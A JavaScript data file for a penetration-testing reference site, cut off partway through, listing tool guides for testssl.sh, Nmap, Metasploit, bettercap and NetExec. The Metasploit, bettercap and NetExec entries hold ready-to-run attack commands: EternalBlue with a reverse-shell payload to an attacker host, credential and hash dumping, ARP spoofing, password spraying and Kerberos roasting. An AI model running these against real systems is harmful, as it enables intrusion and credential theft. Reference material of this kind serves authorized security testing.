/*
  TOOLKIT — the data behind /toolkit.html and /tool-detail.html.

  This file intentionally holds a small, curated set of tools — this is a
  field reference manual, not a link directory. Every tool gets the same
  structure so the detail page (and its search/quick-nav) works the same
  way everywhere:

  {
    id:          "unique-slug",              // required — powers tool-detail.html?tool=<id>
    name:        "Tool Name",
    url:         "https://...",              // official site — "Visit site" button
    description: "One line for the toolkit grid card.",
    brief:       "Overview paragraph(s). Use \n\n to separate paragraphs.",

    quickReference: [                        // always-visible rapid-access box
      { label: "What this does", cmd: "the command or action" }
    ],

    sections: [                              // collapsible, categorized reference —
                                              // this is the bulk of the page
      {
        title: "Category Name",
        type: "table",                       // flags/scripts/options/concepts — 2+ columns
        columns: ["Option", "Description"],
        rows: [["-x", "what it does"], ...]  // arrays matching `columns`, in order
      },
      {
        title: "Common Workflows",
        type: "commands",                    // named, ready-to-run sequences
        commands: [
          { label: "Workflow name", cmd: "step one\nstep two\nstep three" }
        ]
      },
      {
        title: "Notes & Tips",
        type: "notes",                       // plain bullet list, no code styling
        items: ["A tip.", "Another tip."]
      }
    ]
  }

  HOW TO ADD A TOOL:
  1. Add a new { category: "...", tools: [...] } block, or a tool into an
     existing one.
  2. Give it at least `id`, `name`, `url`, `description`. Everything else
     (brief/quickReference/sections) is optional — the detail page only
     builds a "Guide" button on the card if `sections` has content.
  3. Save and refresh — toolkit.html and tool-detail.html both render
     automatically, including the quick-nav and search box.

  Double-check every URL before publishing — this page is meant to be a
  reliable jumping-off point, broken or stale links undermine that.
*/

var TOOLKIT = [
  {
    category: "Network Recon",
    tools: [
      {
        "id": "testssl",
        "name": "testssl.sh",
        "url": "https://github.com/drwetter/testssl.sh",
        "description": "Test a server's TLS/SSL for protocols, ciphers, and known flaws.",
        "brief": "testssl.sh is a single Bash script that audits a host's TLS configuration end to end: supported protocols (SSLv2/3 through TLS 1.3), cipher strength and ordering, forward secrecy, certificate details and chain, HTTP security headers, and the full roster of named vulnerabilities (Heartbleed, ROBOT, POODLE, BEAST, CRIME, Sweet32, and more). It runs from one portable script with no external dependencies and produces clear, colour-graded output that is easy to turn into a report.",
        "quickReference": [
          {
            "label": "Full test",
            "cmd": "testssl.sh https://target.com"
          },
          {
            "label": "Only severe findings",
            "cmd": "testssl.sh --severity HIGH target.com:443"
          },
          {
            "label": "Known vulnerabilities only",
            "cmd": "testssl.sh -U target.com"
          },
          {
            "label": "Machine-readable output",
            "cmd": "testssl.sh --jsonfile out.json --csvfile out.csv target.com"
          }
        ],
        "sections": [
          {
            "title": "Useful Options",
            "type": "table",
            "columns": [
              "Flag",
              "Description"
            ],
            "rows": [
              [
                "-U / --vulnerable",
                "Test for all known TLS vulnerabilities"
              ],
              [
                "-p / --protocols",
                "Check which protocol versions are offered"
              ],
              [
                "-E / --cipher-per-proto",
                "Enumerate ciphers offered per protocol"
              ],
              [
                "-S / --server-defaults",
                "Certificate, chain, and server-default details"
              ],
              [
                "-H / --header",
                "Check HTTP security headers (HSTS, etc.)"
              ],
              [
                "--severity <LOW|MEDIUM|HIGH|CRITICAL>",
                "Only report findings at or above this level"
              ],
              [
                "--jsonfile / --csvfile / --htmlfile",
                "Write machine-readable or HTML reports"
              ],
              [
                "--sneaky / --quiet",
                "Reduce fingerprint/noise of the scan"
              ],
              [
                "--starttls <proto>",
                "Test STARTTLS services (smtp, imap, pop3, ftp, xmpp, ...)"
              ]
            ]
          },
          {
            "title": "Common Workflows",
            "type": "commands",
            "commands": [
              {
                "label": "Full graded report to files",
                "cmd": "testssl.sh --severity LOW --htmlfile r.html --jsonfile r.json target.com:443"
              },
              {
                "label": "STARTTLS services (mail, etc.)",
                "cmd": "testssl.sh --starttls smtp mail.target.com:25\ntestssl.sh --starttls imap mail.target.com:143"
              },
              {
                "label": "Targeted single checks",
                "cmd": "testssl.sh -p target.com          # protocols only\ntestssl.sh --heartbleed --robot --logjam target.com   # named flaws only"
              },
              {
                "label": "Mass / parallel scan",
                "cmd": "testssl.sh --file hosts.txt --parallel --severity MEDIUM"
              }
            ]
          },
          {
            "title": "Notes & Tips",
            "type": "notes",
            "items": [
              "Run against host:port, not just a URL, so you can test mail and other TLS services (e.g. --starttls smtp mail.target.com:25).",
              "Use the official Docker image or the git clone for the newest cipher/vuln database: docker run --rm drwetter/testssl.sh target.com.",
              "Map the findings straight onto the Weak TLS / SSL Configuration write-up — testssl's output is the evidence for that report.",
              "Prefer --severity HIGH for a quick triage, then a full run for the detailed appendix."
            ]
          },
          {
            "title": "References",
            "type": "references",
            "items": [
              {
                "label": "testssl.sh — GitHub",
                "url": "https://github.com/drwetter/testssl.sh"
              },
              {
                "label": "testssl.sh — documentation",
                "url": "https://testssl.sh/"
              }
            ]
          }
        ]
      },
      {
        id: "nmap",
        name: "Nmap",
        url: "https://nmap.org/",
        description: "Network discovery, port scanning, service detection, and OS fingerprinting.",
        brief: "Nmap is the standard network scanner for host discovery, port enumeration, service/version detection, OS fingerprinting, and scripted vulnerability checks via NSE. This page is organized by task — discovery, port selection, scan type, enumeration, scripting, timing, and output — so a specific flag is always a couple of seconds away, not a scroll through one long list.\n\nModern, rarely-used-in-practice scan types (Xmas, FIN, Null, Maimon, idle/zombie scans) are deliberately left out — they're evadable in theory but rarely worth reaching for on a real engagement. What's below is what actually gets used.",
        quickReference: [
          { label: "Fast first-pass sweep across a range", cmd: "sudo nmap -T4 -F --min-rate 300 -n -Pn 10.10.10.0/24" },
          { label: "Full TCP port scan, no assumptions", cmd: "sudo nmap -p- -T4 -n -Pn <target>" },
          { label: "Standard second pass — services + default scripts", cmd: "nmap -sV -sC -p<ports> <target>" },
          { label: "UDP — common ports only, it's slow", cmd: "sudo nmap -sU --top-ports 20 <target>" },
          { label: "Always save output — one flag, every format", cmd: "nmap -oA scan_name <target>" }
        ],
        sections: [
          {
            title: "Discovery",
            type: "table",
            columns: ["Option", "Description"],
            rows: [
              ["-sn", "Ping scan only — skip port scanning entirely"],
              ["-Pn", "Treat all hosts as online, skip host discovery (needed when ICMP is filtered)"],
              ["-n", "Never do DNS resolution — faster scans"],
              ["-R", "Always resolve DNS, even for offline hosts"],
              ["-PE", "ICMP Echo Request ping"],
              ["-PS<ports>", "TCP SYN ping — good ICMP-blocked alternative, e.g. -PS22,80,443"],
              ["-PA<ports>", "TCP ACK ping"],
              ["-PU<ports>", "UDP ping"],
              ["--disable-arp-ping", "Disable ARP discovery on local networks (ARP is normally used automatically and is very reliable on-LAN)"]
            ]
          },
          {
            title: "Port Selection",
            type: "table",
            columns: ["Option", "Description"],
            rows: [
              ["-p<ports>", "Specify ports to scan, e.g. -p22,80,443 or -p1-1000"],
              ["-p-", "Scan all 65,535 TCP ports"],
              ["-F", "Fast mode — scan the top 100 ports only"],
              ["--top-ports <n>", "Scan the top N most common ports"],
              ["--exclude-ports <ports>", "Exclude specific ports from an otherwise broader scan"],
              ["-r", "Scan ports in sequential order instead of randomized"]
            ]
          },
          {
            title: "Scan Types",
            type: "table",
            columns: ["Option", "Description"],
            rows: [
              ["-sS", "TCP SYN scan (half-open). Fast and the default for root — never completes the handshake, so it's quieter in application logs."],
              ["-sT", "TCP connect scan. Completes the full 3-way handshake — used when you can't get raw-socket privileges. Slower, and shows up in app-level logs."],
              ["-sU", "UDP scan. No handshake exists for UDP, so state is inferred from responses (or silence) — slow, and often reports open|filtered."]
            ]
          },
          {
            title: "Enumeration",
            type: "table",
            columns: ["Option", "Description"],
            rows: [
              ["-sV", "Probe open ports to detect service/version"],
              ["--version-intensity <0-9>", "How hard to try during version detection (higher = more probes, slower)"],
              ["-O", "OS detection via TCP/IP stack fingerprinting"],
              ["--osscan-guess", "Guess OS more aggressively when the match isn't clean"],
              ["-A", "Aggregate flag: OS detection + version detection + default scripts + traceroute, all at once"],
              ["Manual banner grab", "nc -nv <target> <port>  or  openssl s_client -connect <target>:443 — confirm what Nmap reported, by hand"]
            ]
          },
          {
            title: "NSE Scripts",
            type: "table",
            columns: ["Category", "Script / Flag", "Description"],
            rows: [
              ["flags", "-sC", "Run the default set of NSE scripts"],
              ["flags", "--script <name>", "Run specific script(s) or a category — comma-separated, wildcards ok (--script http*)"],
              ["flags", "--script-args <k=v>", "Pass arguments into NSE scripts"],
              ["flags", "--script-updatedb", "Refresh the local NSE script database"],
              ["discovery", "broadcast-ping", "Discover extra hosts on the local segment via broadcast ping"],
              ["discovery", "dns-brute", "Brute-force subdomains of a domain via DNS"],
              ["smb", "smb-os-discovery", "Fingerprint OS/version info over SMB"],
              ["smb", "smb-enum-shares", "List SMB shares visible to the supplied (or anonymous) credentials"],
              ["smb", "smb-enum-users", "Enumerate domain/local users over SMB"],
              ["smb", "smb-vuln-ms17-010", "Check for EternalBlue (MS17-010)"],
              ["smb", "smb2-security-mode", "Report whether SMB signing is required — relevant to relay attacks"],
              ["http", "http-title", "Grab the page title — quick sanity check on 80/443"],
              ["http", "http-enum", "Brute-force common web paths/directories"],
              ["http", "http-methods", "List allowed HTTP methods, flag risky ones (PUT/TRACE)"],
              ["http", "http-headers", "Dump the full HTTP response headers"],
              ["dns", "dns-zone-transfer", "Attempt an AXFR zone transfer against a DNS server"],
              ["ssl", "ssl-cert", "Retrieve and parse the presented SSL/TLS certificate"],
              ["ssl", "ssl-enum-ciphers", "Enumerate supported TLS ciphers, flag weak/deprecated ones"],
              ["vuln", "vulners", "Cross-reference detected service versions against the Vulners CVE database"],
              ["vuln", "--script vuln", "Run every installed vuln-category script at once against the target"]
            ]
          },
          {
            title: "Timing & Performance",
            type: "table",
            columns: ["Option", "Description"],
            rows: [
              ["-T0 to -T5", "Timing template — 0 is slowest/stealthiest, 5 is fastest, 3 is Nmap's own default"],
              ["--min-rate <n>", "Never send slower than this many packets/sec"],
              ["--max-rate <n>", "Never send faster than this many packets/sec"],
              ["--host-timeout <time>", "Give up on a host entirely after this long"],
              ["--max-retries <n>", "Cap retransmissions per probe — big time saver on lossy/large scans"],
              ["--scan-delay <time>", "Force a minimum delay between probes (useful for rate-limited targets)"],
              ["--min-parallelism <n>", "Floor on parallel probes — raise it if a scan feels too slow to converge"]
            ]
          },
          {
            title: "Output",
            type: "table",
            columns: ["Option", "Description"],
            rows: [
              ["-oN <file>", "Normal, human-readable output"],
              ["-oX <file>", "XML output — good for feeding into other tools"],
              ["-oG <file>", "Grepable output — handy for quick shell one-liners"],
              ["-oA <name>", "Save all three formats at once (.nmap / .xml / .gnmap)"],
              ["--append-output", "Append to existing output files instead of overwriting"],
              ["--resume <file>", "Resume a previous scan from its saved output file"]
            ]
          },
          {
            title: "Common Workflows",
            type: "commands",
            commands: [
              { label: "Quick external recon", cmd: "sudo nmap -T4 -F --min-rate 300 -n -Pn <target>\nnmap -sV -sC -p<open_ports> <target>\nnmap -oA recon_<target> <target>" },
              { label: "Full internal subnet sweep", cmd: "sudo nmap -sn 10.10.10.0/24 -oG live_hosts.txt\n# then, per live host:\nsudo nmap -p- -T4 -n -Pn <host> -oA fullscan_<host>" },
              { label: "Service & vulnerability enumeration", cmd: "nmap -sV -sC -p<open_ports> <target>\nnmap --script vuln -p<open_ports> <target>" },
              { label: "Stealthier timing profile", cmd: "sudo nmap -sS -T2 --min-parallelism 1 -p<ports> <target>" }
            ]
          },
          {
            title: "Notes & Tips",
            type: "notes",
            items: [
              "-sS, -sU, and -O all need raw-socket privileges — run with sudo, or Nmap silently falls back to a connect scan.",
              "UDP scanning is inherently slow and often ambiguous (open|filtered) — always narrow to specific/top ports first, never run a blind -p- UDP scan.",
              "-Pn is your default when a target's ICMP is filtered (very common on hardened hosts) — otherwise Nmap may report a live host as down.",
              "Port states worth remembering: open (something's listening), closed (reachable, nothing there), filtered (no response — probably a firewall), unfiltered (seen only with ACK-style probes, state undetermined).",
              "-sC runs the 'default' script category — it's broad but not exhaustive. Reach for --script <category> when you need something more targeted.",
              "Always save output (-oA at minimum) — you will want to grep back through a scan later, and re-running it isn't always cheap.",
              "Confirm you have written authorization for the target range before scanning anything you don't own."
            ]
          }
        ]
      },
      {
              "id": "metasploit",
              "name": "Metasploit Framework",
              "url": "https://github.com/rapid7/metasploit-framework",
              "description": "The de-facto exploitation framework — modules for scanning, exploiting, post-exploitation and pivoting.",
              "brief": "Metasploit is the exploitation framework that most other tooling is measured against. Around a database of modules — exploits, auxiliary scanners, post-exploitation and encoders — it gives you a consistent workflow: pick a module, set options, run, and (on success) receive a session you can task further. Its Meterpreter payload is a fully-featured in-memory agent with file, token, and pivoting commands.\n\nOn an AD engagement Metasploit is most useful for the fast-path CVEs (EternalBlue/MS17-010, SMBGhost, the Exchange chains) and for its SMB/relay auxiliary modules, plus routing (autoroute + socks_proxy) to pivot into segmented networks. It is loud by design, so treat it as a scanning/exploitation workhorse rather than a stealth C2. Values shown as <…> are placeholders.",
              "quickReference": [
                      {
                              "label": "Console",
                              "cmd": "msfconsole -q"
                      },
                      {
                              "label": "Search / use a module",
                              "cmd": "search ms17_010\nuse exploit/windows/smb/ms17_010_eternalblue"
                      },
                      {
                              "label": "Set options and run",
                              "cmd": "set RHOSTS <ip>\nset LHOST <attacker>\nrun"
                      },
                      {
                              "label": "Pivot through a session",
                              "cmd": "use post/multi/manage/autoroute\nset SESSION <id>\nrun"
                      }
              ],
              "sections": [
                      {
                              "title": "Core workflow",
                              "type": "commands",
                              "commands": [
                                      {
                                              "label": "Pick, configure and fire a module",
                                              "cmd": "msf6 > use exploit/windows/smb/ms17_010_eternalblue\nmsf6 > show options\nmsf6 > set RHOSTS <ip>\nmsf6 > set PAYLOAD windows/x64/meterpreter/reverse_tcp\nmsf6 > set LHOST <attacker>\nmsf6 > run"
                                      },
                                      {
                                              "label": "Auxiliary scanners (recon, no exploit)",
                                              "cmd": "use auxiliary/scanner/smb/smb_ms17_010\nuse auxiliary/scanner/smb/smb_login\nset RHOSTS <range>\nrun"
                                      },
                                      {
                                              "label": "Handle a session",
                                              "cmd": "sessions -l              # list\nsessions -i <id>         # interact\nbackground               # drop back to console"
                                      }
                              ]
                      },
                      {
                              "title": "Meterpreter essentials",
                              "type": "commands",
                              "commands": [
                                      {
                                              "label": "Host / identity",
                                              "cmd": "getuid\ngetprivs\nsysinfo\nps"
                                      },
                                      {
                                              "label": "Token & privesc",
                                              "cmd": "load incognito\nlist_tokens -u\nimpersonate_token '<DOMAIN\\\\user>'\ngetsystem"
                                      },
                                      {
                                              "label": "Credentials & pivot",
                                              "cmd": "hashdump\nload kiwi ; creds_all\nrun post/multi/manage/autoroute"
                                      }
                              ]
                      },
                      {
                              "title": "Modules worth knowing on AD",
                              "type": "table",
                              "columns": [
                                      "Module",
                                      "Use"
                              ],
                              "rows": [
                                      [
                                              "exploit/windows/smb/ms17_010_eternalblue",
                                              "EternalBlue — SMBv1 RCE on legacy hosts"
                                      ],
                                      [
                                              "auxiliary/scanner/smb/smb_ms17_010",
                                              "Safe check for MS17-010 across a range"
                                      ],
                                      [
                                              "exploit/windows/http/exchange_proxyshell_rce",
                                              "ProxyShell Exchange chain"
                                      ],
                                      [
                                              "post/windows/gather/credentials/domain_hashdump",
                                              "Pull domain hashes from a DC session"
                                      ],
                                      [
                                              "post/multi/manage/autoroute + auxiliary/server/socks_proxy",
                                              "Pivot / SOCKS into internal ranges"
                                      ]
                              ]
                      },
                      {
                              "title": "OPSEC",
                              "type": "notes",
                              "items": [
                                      "Meterpreter and default payloads are heavily signatured — expect AV/EDR to catch stock builds; it is a scanning/exploitation tool, not stealth C2.",
                                      "Prefer the auxiliary check modules before firing an exploit that can crash the target (EternalBlue/SMBGhost can bugcheck a box).",
                                      "Use autoroute + socks_proxy to reach internal hosts through a session instead of exposing more of your infrastructure."
                              ]
                      },
                      {
                              "title": "References",
                              "type": "references",
                              "items": [
                                      {
                                              "label": "Metasploit — GitHub",
                                              "url": "https://github.com/rapid7/metasploit-framework"
                                      },
                                      {
                                              "label": "Vulns & Misconfigs — remote execution",
                                              "url": "vulns.html"
                                      },
                                      {
                                              "label": "AD Attack-Path map",
                                              "url": "ad-map.html"
                                      }
                              ]
                      }
              ]
      },
      {
        "id": "bettercap",
        "name": "bettercap",
        "url": "https://github.com/bettercap/bettercap",
        "description": "Swiss-army knife for network attacks and monitoring — ARP/DNS spoofing, sniffing and MITM.",
        "brief": "bettercap is a modular network-attack and monitoring framework. Through interactive modules (\"caplets\") it performs host discovery, ARP/DNS spoofing, traffic sniffing and man-in-the-middle on a local segment. On an internal engagement it is the tool that puts you in the middle of layer-2 traffic so you can capture or redirect authentication.\n\nFor AD work bettercap pairs with a relay/capture tool: ARP-spoof a victim toward you, then feed the coerced or redirected SMB/HTTP authentication into Responder or ntlmrelayx. It is noisy at layer 2 (gratuitous ARP, duplicate MACs), so use it where dynamic ARP inspection and port security are absent.",
        "quickReference": [
          {
            "label": "Start on an interface",
            "cmd": "sudo bettercap -iface <iface>"
          },
          {
            "label": "Discover hosts",
            "cmd": "net.probe on\nnet.show"
          },
          {
            "label": "ARP spoof a target",
            "cmd": "set arp.spoof.targets <victim_ip>\narp.spoof on"
          },
          {
            "label": "Sniff credentials",
            "cmd": "set net.sniff.verbose true\nnet.sniff on"
          }
        ],
        "sections": [
          {
            "title": "Key modules",
            "type": "table",
            "columns": [
              "Module",
              "Purpose"
            ],
            "rows": [
              [
                "net.probe / net.recon",
                "Active host discovery and passive recon on the segment"
              ],
              [
                "net.show",
                "List discovered hosts, MACs and vendors"
              ],
              [
                "arp.spoof",
                "ARP-poison targets to sit in the middle (set arp.spoof.targets, arp.spoof.fullduplex)"
              ],
              [
                "dns.spoof",
                "Answer DNS queries with attacker IPs (set dns.spoof.domains)"
              ],
              [
                "net.sniff",
                "Capture and parse traffic passing through you (creds, tokens)"
              ],
              [
                "http.proxy / https.proxy",
                "Transparent HTTP(S) proxy; load the hstshijack caplet to strip HSTS"
              ],
              [
                "wifi.recon / wifi.deauth",
                "Monitor-mode AP/client recon and deauthentication"
              ],
              [
                "ble.recon",
                "Bluetooth Low Energy device enumeration"
              ],
              [
                "caplets / events.stream",
                "Scripted sessions (.cap) and the live event log"
              ]
            ]
          },
          {
            "title": "MITM workflow",
            "type": "commands",
            "commands": [
              {
                "label": "Recon the segment",
                "cmd": "sudo bettercap -iface <iface>\n> net.probe on\n> net.show                      # list discovered hosts"
              },
              {
                "label": "ARP poison and intercept",
                "cmd": "> set arp.spoof.targets <victim_ip>\n> set arp.spoof.fullduplex true\n> arp.spoof on\n> net.sniff on                 # capture traffic passing through you"
              },
              {
                "label": "One-liner via caplet / eval",
                "cmd": "sudo bettercap -iface <iface> -eval 'set arp.spoof.targets <victim>; arp.spoof on; net.sniff on'"
              }
            ]
          },
          {
            "title": "OPSEC & defence",
            "type": "notes",
            "items": [
              "ARP spoofing is loud — duplicate-MAC and gratuitous-ARP alerts fire on any switch with security features or an NSM watching layer 2.",
              "Pair with Responder (capture) or ntlmrelayx (relay) to turn redirected auth into NetNTLM hashes or code execution — see Coercion & NTLM Relay theory.",
              "Defences: dynamic ARP inspection, DHCP snooping, port security, and 802.1X neutralise it."
            ]
          },
          {
            "title": "References",
            "type": "references",
            "items": [
              {
                "label": "bettercap — GitHub",
                "url": "https://github.com/bettercap/bettercap"
              },
              {
                "label": "Theory — Coercion & NTLM Relay",
                "url": "theory/2026-08-18-coercion-ntlm-relay.html"
              }
            ]
          }
        ]
      }
    ]
  },
  {
    category: "Active Directory",
    tools: [
      {
        id: "netexec",
        name: "NetExec",
        url: "https://github.com/Pennyw0rth/NetExec",
        description: "Swiss-army knife for AD enumeration, credential validation, and lateral movement.",
        brief: "NetExec (nxc) is the actively maintained continuation of CrackMapExec — used to validate credentials, enumerate SMB/LDAP/WinRM/MSSQL, and move laterally across an Active Directory environment, all from one consistent command shape: nxc <protocol> <target> -u <user> -p <pass> [action flags].",
        quickReference: [
          { label: "Validate credentials across a subnet", cmd: "nxc smb 10.10.10.0/24 -u user -p pass" },
          { label: "List shares once creds are confirmed", cmd: "nxc smb <target> -u user -p pass --shares" },
          { label: "BloodHound collection over LDAP", cmd: "nxc ldap <dc> -u user -p pass -d domain.local --bloodhound -c All" },
          { label: "Password spray (one password, many users)", cmd: "nxc smb 10.10.10.0/24 -u users.txt -p 'Password1' --continue-on-success" },
          { label: "Run a command with valid creds", cmd: "nxc smb <target> -u user -p pass -x whoami" }
        ],
        sections: [
          {
            title: "SMB",
            type: "table",
            columns: ["Command", "Description"],
            rows: [
              ["nxc smb <target> -u user -p pass", "Basic auth check — confirms creds work over SMB"],
              ["nxc smb <target> -u user -p pass --shares", "Enumerate accessible shares"],
              ["nxc smb <target> -u user -p pass --sessions", "List active sessions on the target"],
              ["nxc smb <target> -u user -p pass --loggedon-users", "List currently logged-on users"],
              ["nxc smb <target> -u user -p pass --sam", "Dump the local SAM database (needs local admin)"],
              ["nxc smb <target> -u user -p pass --lsa", "Dump LSA secrets (needs local admin)"],
              ["nxc smb <target> -u user -p pass -x \"whoami\"", "Execute a command on the target"],
              ["nxc smb <target> -u user -p pass --pass-pol", "Read the domain password policy — check this before spraying"]
            ]
          },
          {
            title: "WinRM",
            type: "table",
            columns: ["Command", "Description"],
            rows: [
              ["nxc winrm <target> -u user -p pass", "Check whether the account can authenticate over WinRM"],
              ["nxc winrm <target> -u user -p pass -x \"whoami\"", "Execute a single command over WinRM"],
              ["evil-winrm -i <target> -u user -p pass", "For an actual interactive shell — nxc confirms access, evil-winrm gives you the session"]
            ]
          },
          {
            title: "LDAP",
            type: "table",
            columns: ["Command", "Description"],
            rows: [
              ["nxc ldap <dc> -u user -p pass", "Basic bind check against the domain controller"],
              ["nxc ldap <dc> -u user -p pass --users", "Enumerate domain users"],
              ["nxc ldap <dc> -u user -p pass --groups", "Enumerate domain groups"],
              ["nxc ldap <dc> -u user -p pass --admin-count", "List accounts with adminCount=1 (current or former privileged accounts)"],
              ["nxc ldap <dc> -u user -p pass --trusted-for-delegation", "Find accounts trusted for unconstrained delegation"],
              ["nxc ldap <dc> -u user -p pass --asreproast out.txt", "AS-REP roast accounts with Kerberos pre-auth disabled"],
              ["nxc ldap <dc> -u user -p pass --kerberoasting out.txt", "Kerberoast accounts with an SPN set"]
            ]
          },
          {
            title: "MSSQL",
            type: "table",
            columns: ["Command", "Description"],
            rows: [
              ["nxc mssql <target> -u user -p pass", "Check SQL auth (add --local-auth for a local SQL account rather than a domain one)"],
              ["nxc mssql <target> -u user -p pass -x \"whoami\"", "Execute a command via xp_cmdshell, if enabled"]
            ]
          },
          {
            title: "Password Spraying",
            type: "table",
            columns: ["Command", "Description"],
            rows: [
              ["nxc smb <range> -u users.txt -p 'Password1' --continue-on-success", "Spray one password across many users — always add --continue-on-success or it stops at the first hit"],
              ["nxc smb <range> -u user -p passwords.txt", "The inverse — one user, many candidate passwords (use sparingly, lockout risk)"],
              ["nxc smb <range> -u users.txt -p passwords.txt --no-bruteforce", "Pair users.txt and passwords.txt line-by-line instead of trying every combination"]
            ]
          },
          {
            title: "Password spraying — build the user list, then spray",
            type: "commands",
            commands: [
              { label: "User list from a BloodHound collection (users.json)", cmd: "# SharpHound / bloodhound-python output includes a *_users.json\njq -r '.data[].Properties.samaccountname' *_users.json | sort -u > users.txt\n# no jq? pull it with grep:\ngrep -oE '\"samaccountname\": *\"[^\"]+\"' *_users.json | cut -d'\"' -f4 | sort -u > users.txt\n# only enabled accounts:\njq -r '.data[] | select(.Properties.enabled) | .Properties.samaccountname' *_users.json | sort -u > users.txt" },
              { label: "User list from NetExec (valid cred, or a null session)", cmd: "# with any domain credential, over LDAP (Username is column 5):\nnxc ldap <dc> -u <user> -p '<pass>' --users | awk '{print $5}' | sort -u > users.txt\n# no creds? RID-cycle a null/guest SMB session, then keep the username (the part after the backslash):\nnxc smb <dc> -u guest -p '' --rid-brute" },
              { label: "No creds at all — Kerbrute user enumeration (pre-auth)", cmd: "kerbrute userenum -d bank.local --dc <dc-ip> /usr/share/seclists/Usernames/xato-net-10-million-usernames-dup.txt -o kerb.out\ngrep 'VALID USERNAME' kerb.out | awk '{print $NF}' | cut -d@ -f1 | sort -u > users.txt" },
              { label: "Check the lockout policy, THEN spray one password", cmd: "nxc smb <dc> -u <user> -p '<pass>' --pass-pol        # read the lockout threshold + window first\nnxc smb <range> -u users.txt -p 'Season2026!' --continue-on-success\n#   one password across all users; --continue-on-success or it stops at the first hit\n#   stay one guess under the lockout threshold, and wait out the window between rounds" }
            ]
          },
          {
            title: "Timeroasting (unauthenticated)",
            type: "commands",
            commands: [
              { label: "Harvest computer / trust-account hashes from the DC (no creds)", cmd: "nxc smb <dc-ip> -u '' -p '' -M timeroast\n# MS-SNTP: the DC answers NTP with a MAC keyed on the account's password hash, so\n# this needs NO valid credential (the null SMB login just triggers the module).\n# output is hashcat format:  <rid>:$sntp-ms$<hash>$<salt>" },
              { label: "Crack, then map the RID back to an account", cmd: "hashcat -m 31300 timeroast.hashes /usr/share/wordlists/rockyou.txt\n#   -m 31300 = MS-SNTP. machine passwords are usually random/uncrackable — the wins\n#   are weakly-set machine accounts and trust accounts.\nnxc smb <dc-ip> -u <user> -p '<pass>' --rid-brute   # RID -> account name" },
              { label: "If null sessions are blocked — standalone tool", cmd: "# SecuraBV's timeroast is pure NTP (no SMB) and has RID/rate control:\npython3 timeroast.py <dc-ip> -o timeroast.hashes" }
            ]
          },
          {
            title: "Shares",
            type: "table",
            columns: ["Command", "Description"],
            rows: [
              ["nxc smb <target> -u '' -p ''  --shares", "Check for shares reachable with blank/anonymous credentials"],
              ["nxc smb <target> -u user -p pass --shares", "List shares reachable with valid credentials"],
              ["smbclient //<target>/<share> -U user", "Actually browse a share's contents once you know it's accessible"]
            ]
          },
          {
            title: "Users & Groups",
            type: "table",
            columns: ["Command", "Description"],
            rows: [
              ["nxc ldap <dc> -u user -p pass --users", "Enumerate all domain users"],
              ["nxc ldap <dc> -u user -p pass --groups", "Enumerate all domain groups"],
              ["nxc smb <target> -u user -p pass --rid-brute", "RID-cycle a target to enumerate users/groups even with limited LDAP access"]
            ]
          },
          {
            title: "BloodHound Collection",
            type: "table",
            columns: ["Command", "Description"],
            rows: [
              ["nxc ldap <dc> -u user -p pass -d domain.local --bloodhound -c All", "Collect the full BloodHound dataset over LDAP"],
              ["--dns-server <ip>", "Point collection at a specific DNS server if the domain's default doesn't resolve for you"],
              [".zip output", "Collected data is written as a timestamped .zip — import it directly into BloodHound CE"]
            ]
          },
          {
            title: "Credential Validation",
            type: "table",
            columns: ["Command", "Description"],
            rows: [
              ["nxc smb <target> -u user -p pass", "Single credential check — quick pass/fail"],
              ["Green output", "Indicates the credential is valid"],
              ["(Pwn3d!)", "Appears when the account also has local admin on the target"]
            ]
          },
          {
            "title": "Modules (-M) — full reference (124)",
            "type": "table",
            "columns": [
              "Module (-M)",
              "Protocol",
              "What it does"
            ],
            "rows": [
              [
                "-M adcs",
                "ldap",
                "Find PKI Enrollment Services in Active Directory and Certificate Templates Names"
              ],
              [
                "-M add-computer",
                "smb, ldap",
                "Adds or deletes a domain computer via SAMR (SMB) or LDAP"
              ],
              [
                "-M aws-credentials",
                "ssh, smb, winrm",
                "Search for aws credentials files."
              ],
              [
                "-M backup_operator",
                "smb",
                "Exploit user in backup operator group to dump NTDS @mpgn_x64"
              ],
              [
                "-M badsuccessor",
                "ldap",
                "Check if vulnerable to bad successor attack (DMSA)"
              ],
              [
                "-M bitlocker",
                "smb, wmi",
                "Enumerating BitLocker Status on target(s) If it is enabled or disabled."
              ],
              [
                "-M certipy-find",
                "ldap",
                "certipy find command with options to export the result to text/csv/json. Default: Show only vulnerable templates"
              ],
              [
                "-M change-password",
                "smb",
                "Change or reset user passwords via various protocols"
              ],
              [
                "-M coerce_plus",
                "smb",
                "Module to check if the Target is vulnerable to any coerce vulns. Set LISTENER IP for coercion."
              ],
              [
                "-M daclread",
                "ldap",
                "Read and backup the Discretionary Access Control List of objects. Be careful, this module cannot read the DACLS recursively, see more explanation in the options."
              ],
              [
                "-M dns-nonsecure",
                "ldap",
                "Detects DNS zones that allow nonsecure dynamic updates"
              ],
              [
                "-M dpapi_hash",
                "smb, wmi, winrm, mssql",
                "Remotely dump Dpapi hash based on masterkeys"
              ],
              [
                "-M drop-library-ms",
                "smb",
                "Creates and uploads an arbitrary .library-ms on writable shares, leveraging CVE-2025-24054 for looting NTLMv2 hash"
              ],
              [
                "-M drop-sc",
                "smb",
                "Drop a searchConnector-ms file on each writable share"
              ],
              [
                "-M dump-computers",
                "ldap",
                "Dumps FQDN and OS of all computers in the domain"
              ],
              [
                "-M empire_exec",
                "smb, mssql",
                "Uses Empire's RESTful API to generate a launcher for the specified listener and executes it"
              ],
              [
                "-M enable_cmdshell",
                "mssql",
                "Enable or disable xp_cmdshell in MSSQL Server"
              ],
              [
                "-M entra-id",
                "ldap",
                "Find the Entra ID sync server"
              ],
              [
                "-M enum_av",
                "smb",
                "Gathers information on all endpoint protection solutions installed on the the remote host(s) via LsarLookupNames (no privilege needed)"
              ],
              [
                "-M enum_ca",
                "smb",
                "Anonymously uses RPC endpoints to hunt for ADCS CAs"
              ],
              [
                "-M enum_cve",
                "smb",
                "Enumerate common (useful) CVEs by querying the registry for the OS version and UBR."
              ],
              [
                "-M enum_dns",
                "smb, wmi",
                "Uses WMI to dump DNS from an AD DNS Server"
              ],
              [
                "-M enum_impersonate",
                "mssql",
                "Enumerate users with impersonation privileges"
              ],
              [
                "-M enum_interfaces",
                "smb",
                "Retrieve the list of network interfaces info (Name, IP Address, Subnet Mask, Default Gateway) from remote Windows registry (formerly --interfaces)"
              ],
              [
                "-M enum_links",
                "mssql",
                "Enumerate linked SQL Servers and their login configurations."
              ],
              [
                "-M enum_logins",
                "mssql",
                "Enumerate SQL Server logins (SQL, Domain, Local users)"
              ],
              [
                "-M eventlog_creds",
                "smb",
